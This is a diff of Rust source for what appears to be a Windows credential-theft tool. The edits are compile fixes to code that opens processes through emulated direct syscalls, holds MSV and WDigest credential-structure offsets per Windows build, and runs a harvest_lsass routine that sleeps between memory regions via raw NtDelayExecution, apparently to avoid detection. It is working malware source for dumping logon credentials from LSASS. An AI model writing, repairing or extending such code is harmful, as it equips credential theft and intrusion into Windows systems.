@@ -140,14 +140,20 @@ unsafe fn nt_open_process(
     pid: u32,
     desired_access: u32,
 ) -> Result<HANDLE> {
-    use winapi::shared::ntdef::{OBJECT_ATTRIBUTES, CLIENT_ID};
+    use winapi::shared::ntdef::OBJECT_ATTRIBUTES;
+
+    #[repr(C)]
+    struct CLIENT_ID {
+        UniqueProcess: HANDLE,
+        UniqueThread: HANDLE,
+    }
 
     let mut handle: HANDLE = ptr::null_mut();
     let mut oa: OBJECT_ATTRIBUTES = std::mem::zeroed();
     oa.Length = std::mem::size_of::<OBJECT_ATTRIBUTES>() as u32;
 
     let mut cid: CLIENT_ID = std::mem::zeroed();
-    cid.UniqueProcess = pid as *mut _;
+    cid.UniqueProcess = pid as usize as HANDLE;
 
     #[cfg(all(windows, feature = "syscall-emulation"))]
     {
@@ -427,7 +433,7 @@ struct SystemHandleInformation {
 // ── Windows build detection ────────────────────────────────────────────────
 
 /// MSV credential structure offsets keyed by Windows build number.
-#[derive(Clone, Copy)]
+#[derive(Clone, Copy, Debug)]
 struct MsvOffsets {
     /// Offset to the primary credential from MSV1_0_CREDENTIAL.
     primary_cred_offset: usize,
@@ -492,7 +498,7 @@ const WDIGEST_OFFSET_TABLE: &[(u32, WdigestOffsets)] = &[
 
 /// Detect the Windows build number via RtlGetVersion.
 fn get_windows_build() -> u32 {
-    use winapi::um::sysinfoapi::{OSVERSIONINFOEXW};
+    use winapi::um::winnt::OSVERSIONINFOEXW;
     use winapi::shared::ntdef::{NTSTATUS};
 
     // RtlGetVersion is exported by ntdll and always returns accurate version
@@ -1677,7 +1683,7 @@ pub fn harvest_lsass() -> Result<String> {
             let delay = std::time::Duration::from_millis(INTER_REGION_SLEEP_MS as u64);
             let mut li = -(delay.as_nanos() as i64) / 100; // negative = relative, in 100ns units
             let li_bytes = std::mem::transmute::<i64, [u8; 8]>(li);
-            let _ = crate::syscalls::syscall!(
+            let _ = crate::syscall!(
                 "NtDelayExecution",
                 0u64,           // Alertable = FALSE
                 li_bytes.as_ptr() as u64,
